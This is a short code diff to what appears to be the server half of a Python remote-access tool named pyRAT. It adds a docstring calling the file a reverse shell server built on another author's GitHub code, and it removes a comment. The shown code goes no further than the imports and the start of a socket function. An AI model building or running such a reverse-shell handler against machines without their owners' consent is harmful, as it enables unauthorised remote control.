@@ -1,8 +1,18 @@
+"""
+pyRAT reverse shell server
+
+usage: python v_server.py
+
+notes:
+
+credit: Ivan Teong : https://github.com/iteong/reverse-shell
+            his code is used as the base of my reverse shell handler
+
+"""
+
 import socket
 import sys
 
-
-# socket to allow 2 computers to connect
 
 def create_socket():
     try:
